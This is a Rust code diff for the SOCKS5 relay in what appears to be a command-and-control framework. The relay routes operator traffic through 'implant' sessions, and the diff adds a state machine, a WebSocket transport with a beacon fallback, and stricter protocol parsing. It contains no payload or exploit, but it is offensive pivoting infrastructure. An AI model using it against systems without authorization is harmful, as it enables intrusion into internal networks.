@@ -24,6 +24,7 @@ use std::sync::Arc;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::{TcpListener, TcpStream};
 use tokio::sync::{mpsc, Mutex, RwLock};
+use tokio::task::JoinHandle;
 
 use specter_common::proto::specter::v1::TaskPriority;
 
@@ -54,33 +55,63 @@ const SOCKS_MSG_HDR_SIZE: usize = 8;
 type ConnSender = mpsc::Sender<Vec<u8>>;
 type ConnReceiver = mpsc::Receiver<Vec<u8>>;
 
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum SocksRelayState {
+    Starting,
+    Ready,
+    Degraded,
+    Stopping,
+    Stopped,
+}
+
+impl SocksRelayState {
+    fn as_str(self) -> &'static str {
+        match self {
+            Self::Starting => "starting",
+            Self::Ready => "ready",
+            Self::Degraded => "degraded",
+            Self::Stopping => "stopping",
+            Self::Stopped => "stopped",
+        }
+    }
+}
+
 /// Tracks the SOCKS5 relay state for one implant session.
 pub struct SocksRelay {
     session_id: String,
     bind_addr: String,
+    channel_url: String,
     next_conn_id: Mutex<u16>,
     /// Map of conn_id → sender for routing implant data to the right TCP stream.
     conn_channels: RwLock<HashMap<u16, ConnSender>>,
+    interactive_tx: RwLock<Option<mpsc::Sender<Vec<u8>>>>,
     _session_manager: Arc<SessionManager>,
     task_dispatcher: Arc<TaskDispatcher>,
     running: RwLock<bool>,
+    state: RwLock<SocksRelayState>,
+    accept_task: Mutex<Option<JoinHandle<()>>>,
 }
 
 impl SocksRelay {
     pub fn new(
         session_id: String,
         bind_addr: String,
+        channel_url: String,
         session_manager: Arc<SessionManager>,
         task_dispatcher: Arc<TaskDispatcher>,
     ) -> Self {
         Self {
             session_id,
             bind_addr,
+            channel_url,
             next_conn_id: Mutex::new(1),
             conn_channels: RwLock::new(HashMap::new()),
+            interactive_tx: RwLock::new(None),
             _session_manager: session_manager,
             task_dispatcher,
             running: RwLock::new(false),
+            state: RwLock::new(SocksRelayState::Starting),
+            accept_task: Mutex::new(None),
         }
     }
 
@@ -144,7 +175,7 @@ impl SocksRelay {
         conn_id: u16,
         msg_type: u8,
         payload: &[u8],
-    ) -> Result<(), String> {
+    ) -> Result<Option<String>, String> {
         let mut buf = Vec::with_capacity(SOCKS_MSG_HDR_SIZE + payload.len());
         buf.extend_from_slice(&conn_id.to_le_bytes());
         buf.push(msg_type);
@@ -152,7 +183,15 @@ impl SocksRelay {
         buf.extend_from_slice(&(payload.len() as u32).to_le_bytes());
         buf.extend_from_slice(payload);
 
-        self.task_dispatcher
+        if let Some(tx) = self.interactive_tx.read().await.as_ref().cloned() {
+            tx.send(buf)
+                .await
+                .map_err(|_| "SOCKS interactive channel is closed".to_string())?;
+            return Ok(None);
+        }
+
+        let task_id = self
+            .task_dispatcher
             .queue_task(
                 &self.session_id,
                 "socks_data",
@@ -163,7 +202,38 @@ impl SocksRelay {
             .await
             .map_err(|e| format!("Failed to queue socks task: {e}"))?;
 
-        Ok(())
+        Ok(Some(task_id))
+    }
+
+    pub async fn attach_interactive_channel(&self) -> mpsc::Receiver<Vec<u8>> {
+        let (tx, rx) = mpsc::channel(1024);
+        *self.interactive_tx.write().await = Some(tx);
+        rx
+    }
+
+    pub async fn detach_interactive_channel(&self) {
+        *self.interactive_tx.write().await = None;
+    }
+
+    async fn active_transport(&self) -> &'static str {
+        if self.interactive_tx.read().await.is_some() {
+            "websocket"
+        } else {
+            "beacon_fallback"
+        }
+    }
+
+    async fn state_name(&self) -> String {
+        self.state.read().await.as_str().to_string()
+    }
+
+    async fn mark_start_result(&self, success: bool) {
+        let mut state = self.state.write().await;
+        *state = if success {
+            SocksRelayState::Ready
+        } else {
+            SocksRelayState::Degraded
+        };
     }
 
     /// Start the SOCKS5 listener. Returns a handle that can be used to stop it.
@@ -175,6 +245,7 @@ impl SocksRelay {
             }
             *running = true;
         }
+        *self.state.write().await = SocksRelayState::Starting;
 
         let listener = TcpListener::bind(&self.bind_addr)
             .await
@@ -187,7 +258,7 @@ impl SocksRelay {
         );
 
         let relay = Arc::clone(&self);
-        tokio::spawn(async move {
+        let handle = tokio::spawn(async move {
             loop {
                 {
                     let running = relay.running.read().await;
@@ -213,44 +284,65 @@ impl SocksRelay {
             }
             tracing::info!("SOCKS5 relay stopped for session {}", relay.session_id);
         });
+        *self.accept_task.lock().await = Some(handle);
 
         Ok(())
     }
 
     /// Stop the SOCKS5 listener.
-    pub async fn stop(&self) {
-        let mut running = self.running.write().await;
-        *running = false;
-        // Send stop signal to implant module (CLOSE with conn_id=0)
-        let _ = self.send_to_implant(0, MSG_CLOSE, &[]).await;
+    pub async fn stop(&self) -> Result<Option<String>, String> {
+        *self.state.write().await = SocksRelayState::Stopping;
+        *self.running.write().await = false;
+
+        let stop_task_result = self.send_to_implant(0, MSG_CLOSE, &[]).await;
+
+        if let Some(handle) = self.accept_task.lock().await.take() {
+            handle.abort();
+            let _ = handle.await;
+        }
+
+        let senders = self
+            .conn_channels
+            .read()
+            .await
+            .values()
+            .cloned()
+            .collect::<Vec<_>>();
+        for tx in senders {
+            let _ = tx.send(vec![MSG_CLOSE]).await;
+        }
+        self.conn_channels.write().await.clear();
+
+        *self.state.write().await = SocksRelayState::Stopped;
+        stop_task_result
     }
 
     /// Handle a single SOCKS5 client connection.
     async fn handle_client(self: Arc<Self>, mut stream: TcpStream) -> Result<(), String> {
+        if *self.state.read().await != SocksRelayState::Ready {
+            return Err("SOCKS relay is not ready".to_string());
+        }
+
         // --- SOCKS5 method selection ---
-        let mut buf = [0u8; 258];
-        let n = stream
-            .read(&mut buf)
+        let mut method_hdr = [0u8; 2];
+        stream
+            .read_exact(&mut method_hdr)
             .await
             .map_err(|e| format!("read error: {e}"))?;
 
-        if n < 2 || buf[0] != SOCKS5_VERSION {
+        if method_hdr[0] != SOCKS5_VERSION {
             return Err("Not a SOCKS5 client".to_string());
         }
 
-        let nmethods = buf[1] as usize;
-        if n < 2 + nmethods {
-            return Err("Truncated method selection".to_string());
-        }
+        let nmethods = method_hdr[1] as usize;
+        let mut methods = vec![0u8; nmethods];
+        stream
+            .read_exact(&mut methods)
+            .await
+            .map_err(|e| format!("read error: {e}"))?;
 
         // Check if NO_AUTH is offered
-        let mut has_noauth = false;
-        for i in 0..nmethods {
-            if buf[2 + i] == SOCKS5_AUTH_NONE {
-                has_noauth = true;
-                break;
-            }
-        }
+        let has_noauth = methods.contains(&SOCKS5_AUTH_NONE);
 
         if !has_noauth {
             stream
@@ -267,18 +359,19 @@ impl SocksRelay {
             .map_err(|e| format!("write error: {e}"))?;
 
         // --- SOCKS5 CONNECT request ---
-        let n = stream
-            .read(&mut buf)
+        let mut req_hdr = [0u8; 4];
+        stream
+            .read_exact(&mut req_hdr)
             .await
             .map_err(|e| format!("read error: {e}"))?;
 
-        if n < 4 || buf[0] != SOCKS5_VERSION {
+        if req_hdr[0] != SOCKS5_VERSION {
             return Err("Invalid SOCKS5 request".to_string());
         }
 
-        let cmd = buf[1];
-        // buf[2] is RSV
-        let atyp = buf[3];
+        let cmd = req_hdr[1];
+        // req_hdr[2] is RSV
+        let atyp = req_hdr[3];
 
         if cmd != SOCKS5_CMD_CONNECT {
             // Send command not supported reply
@@ -291,50 +384,58 @@ impl SocksRelay {
         // Payload format for implant: [1B atyp][variable addr][2B port_be]
         let (connect_payload, _target_desc) = match atyp {
             SOCKS5_ATYP_IPV4 => {
-                if n < 10 {
-                    return Err("Truncated IPv4 request".to_string());
-                }
+                let mut addr = [0u8; 6];
+                stream
+                    .read_exact(&mut addr)
+                    .await
+                    .map_err(|e| format!("read error: {e}"))?;
                 let mut payload = Vec::with_capacity(7);
                 payload.push(SOCKS5_ATYP_IPV4);
-                payload.extend_from_slice(&buf[4..8]); // 4 bytes IPv4
-                payload.extend_from_slice(&buf[8..10]); // 2 bytes port
+                payload.extend_from_slice(&addr[0..4]); // 4 bytes IPv4
+                payload.extend_from_slice(&addr[4..6]); // 2 bytes port
                 let desc = format!(
                     "{}.{}.{}.{}:{}",
-                    buf[4],
-                    buf[5],
-                    buf[6],
-                    buf[7],
-                    u16::from_be_bytes([buf[8], buf[9]])
+                    addr[0],
+                    addr[1],
+                    addr[2],
+                    addr[3],
+                    u16::from_be_bytes([addr[4], addr[5]])
                 );
                 (payload, desc)
             }
             SOCKS5_ATYP_DOMAIN => {
-                if n < 5 {
-                    return Err("Truncated domain request".to_string());
-                }
-                let dlen = buf[4] as usize;
-                if n < 5 + dlen + 2 {
-                    return Err("Truncated domain request".to_string());
-                }
+                let mut len_buf = [0u8; 1];
+                stream
+                    .read_exact(&mut len_buf)
+                    .await
+                    .map_err(|e| format!("read error: {e}"))?;
+                let dlen = len_buf[0] as usize;
+                let mut addr = vec![0u8; dlen + 2];
+                stream
+                    .read_exact(&mut addr)
+                    .await
+                    .map_err(|e| format!("read error: {e}"))?;
                 let mut payload = Vec::with_capacity(2 + dlen + 2);
                 payload.push(SOCKS5_ATYP_DOMAIN);
-                payload.push(buf[4]); // domain length
-                payload.extend_from_slice(&buf[5..5 + dlen]); // domain
-                payload.extend_from_slice(&buf[5 + dlen..5 + dlen + 2]); // port
-                let domain = String::from_utf8_lossy(&buf[5..5 + dlen]).to_string();
-                let port = u16::from_be_bytes([buf[5 + dlen], buf[5 + dlen + 1]]);
+                payload.push(len_buf[0]); // domain length
+                payload.extend_from_slice(&addr[..dlen]); // domain
+                payload.extend_from_slice(&addr[dlen..dlen + 2]); // port
+                let domain = String::from_utf8_lossy(&addr[..dlen]).to_string();
+                let port = u16::from_be_bytes([addr[dlen], addr[dlen + 1]]);
                 let desc = format!("{domain}:{port}");
                 (payload, desc)
             }
             SOCKS5_ATYP_IPV6 => {
-                if n < 22 {
-                    return Err("Truncated IPv6 request".to_string());
-                }
+                let mut addr = [0u8; 18];
+                stream
+                    .read_exact(&mut addr)
+                    .await
+                    .map_err(|e| format!("read error: {e}"))?;
                 // We forward the request to the implant which will reject IPv6
                 let mut payload = Vec::with_capacity(19);
                 payload.push(SOCKS5_ATYP_IPV6);
-                payload.extend_from_slice(&buf[4..20]); // 16 bytes IPv6
-                payload.extend_from_slice(&buf[20..22]); // 2 bytes port
+                payload.extend_from_slice(&addr[0..16]); // 16 bytes IPv6
+                payload.extend_from_slice(&addr[16..18]); // 2 bytes port
                 (payload, "IPv6 target".to_string())
             }
             _ => {
@@ -467,9 +568,25 @@ fn socks5_reply(rep: u8, bind_addr: &[u8; 4], bind_port: u16) -> Vec<u8> {
 
 /// Manager that tracks SOCKS relays across multiple sessions.
 pub struct SocksManager {
-    relays: RwLock<HashMap<String, Arc<SocksRelay>>>,
+    relays: RwLock<HashMap<String, SocksRelayEntry>>,
     session_manager: Arc<SessionManager>,
     task_dispatcher: Arc<TaskDispatcher>,
+}
+
+#[derive(Clone)]
+struct SocksRelayEntry {
+    relay: Arc<SocksRelay>,
+    started_task_id: String,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct SocksRelayInfo {
+    pub session_id: String,
+    pub bind_addr: String,
+    pub started_task_id: String,
+    pub channel_url: String,
+    pub transport: String,
+    pub state: String,
 }
 
 impl SocksManager {
@@ -482,7 +599,13 @@ impl SocksManager {
     }
 
     /// Start a SOCKS5 relay for a session on the given bind address.
-    pub async fn start_relay(&self, session_id: &str, bind_addr: &str) -> Result<(), String> {
+    pub async fn start_relay(
+        &self,
+        session_id: &str,
+        bind_addr: &str,
+        channel_url: &str,
+        started_task_id: &str,
+    ) -> Result<(), String> {
         {
             let relays = self.relays.read().await;
             if relays.contains_key(session_id) {
@@ -495,47 +618,103 @@ impl SocksManager {
         let relay = Arc::new(SocksRelay::new(
             session_id.to_string(),
             bind_addr.to_string(),
+            channel_url.to_string(),
             Arc::clone(&self.session_manager),
             Arc::clone(&self.task_dispatcher),
         ));
 
         relay.clone().start().await?;
 
-        self.relays
-            .write()
-            .await
-            .insert(session_id.to_string(), relay);
+        self.relays.write().await.insert(
+            session_id.to_string(),
+            SocksRelayEntry {
+                relay,
+                started_task_id: started_task_id.to_string(),
+            },
+        );
 
         Ok(())
     }
 
     /// Stop a SOCKS5 relay for a session.
-    pub async fn stop_relay(&self, session_id: &str) -> Result<(), String> {
-        let relay = self
-            .relays
-            .write()
-            .await
-            .remove(session_id)
-            .ok_or_else(|| format!("No SOCKS relay for session {session_id}"))?;
+    pub async fn stop_relay(&self, session_id: &str) -> Result<Option<String>, String> {
+        let relay = {
+            let relays = self.relays.read().await;
+            relays
+                .get(session_id)
+                .cloned()
+                .ok_or_else(|| format!("No SOCKS relay for session {session_id}"))?
+        };
 
-        relay.stop().await;
-        Ok(())
+        let stop_task_id = relay.relay.stop().await;
+        self.relays.write().await.remove(session_id);
+        stop_task_id
     }
 
     /// Route an implant SOCKS message to the appropriate relay.
     pub async fn route_message(&self, session_id: &str, data: &[u8]) {
         let relays = self.relays.read().await;
-        if let Some(relay) = relays.get(session_id) {
-            relay.route_implant_message(data).await;
+        if let Some(entry) = relays.get(session_id) {
+            entry.relay.route_implant_message(data).await;
+        }
+    }
+
+    pub async fn mark_started_task_result(&self, session_id: &str, task_id: &str, success: bool) {
+        let relays = self.relays.read().await;
+        if let Some(entry) = relays.get(session_id) {
+            if entry.started_task_id == task_id {
+                entry.relay.mark_start_result(success).await;
+            }
+        }
+    }
+
+    /// Attach a live WebSocket-backed channel for a session. Outbound
+    /// SOCKS_MSG frames returned by the receiver must be sent to the implant.
+    pub async fn attach_interactive_channel(
+        &self,
+        session_id: &str,
+    ) -> Result<mpsc::Receiver<Vec<u8>>, String> {
+        let relays = self.relays.read().await;
+        let entry = relays
+            .get(session_id)
+            .ok_or_else(|| format!("No SOCKS relay for session {session_id}"))?;
+        Ok(entry.relay.attach_interactive_channel().await)
+    }
+
+    pub async fn detach_interactive_channel(&self, session_id: &str) {
+        let relays = self.relays.read().await;
+        if let Some(entry) = relays.get(session_id) {
+            entry.relay.detach_interactive_channel().await;
         }
     }
 
     /// List active SOCKS relays.
-    pub async fn list_relays(&self) -> Vec<(String, String)> {
+    pub async fn list_relays(&self) -> Vec<SocksRelayInfo> {
         let relays = self.relays.read().await;
-        relays
+        let entries = relays
             .iter()
-            .map(|(sid, r)| (sid.clone(), r.bind_addr.clone()))
-            .collect()
+            .map(|(sid, entry)| (sid.clone(), entry.clone()))
+            .collect::<Vec<_>>();
+        drop(relays);
+
+        let mut out = Vec::with_capacity(entries.len());
+        for (sid, entry) in entries {
+            out.push(SocksRelayInfo {
+                session_id: sid,
+                bind_addr: entry.relay.bind_addr.clone(),
+                started_task_id: entry.started_task_id.clone(),
+                channel_url: entry.relay.channel_url.clone(),
+                transport: entry.relay.active_transport().await.to_string(),
+                state: entry.relay.state_name().await,
+            });
+        }
+        out
+    }
+
+    pub async fn relay_info(&self, session_id: &str) -> Option<SocksRelayInfo> {
+        self.list_relays()
+            .await
+            .into_iter()
+            .find(|relay| relay.session_id == session_id)
     }
 }
